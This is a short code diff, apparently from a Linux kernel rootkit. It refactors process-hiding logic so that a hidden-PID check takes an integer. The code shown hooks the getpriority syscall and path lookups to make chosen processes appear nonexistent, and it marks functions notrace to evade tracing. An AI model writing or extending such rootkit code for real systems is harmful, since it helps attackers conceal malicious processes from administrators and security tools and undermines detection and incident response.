@@ -10,7 +10,7 @@ notrace bool should_hide_path(const char __user *pathname)
 {
     char buf[PATH_BUF_SIZE];
     long copied;
-    int i;
+    int i, pid;
 
     if (!pathname)
         return false;
@@ -40,7 +40,10 @@ notrace bool should_hide_path(const char __user *pathname)
         }
         pid_buf[j] = '\0';
 
-        if (j > 0 && is_hidden_pid(pid_buf)) {
+        if (kstrtoint(pid_buf, 10, &pid) < 0)
+            return false;
+
+        if (j > 0 && is_hidden_pid(pid)) {
             return true;
         }
     }
@@ -350,11 +353,9 @@ static notrace asmlinkage long hooked_sys_getpriority(const struct pt_regs *regs
 {
     int which = regs->di;
     int who = regs->si;
-    char pid_buf[16];
 
     if (which == PRIO_PROCESS) {
-        snprintf(pid_buf, sizeof(pid_buf), "%d", who);
-        if (is_hidden_pid(pid_buf))
+        if (is_hidden_pid(who))
             return -ESRCH;
     }
 
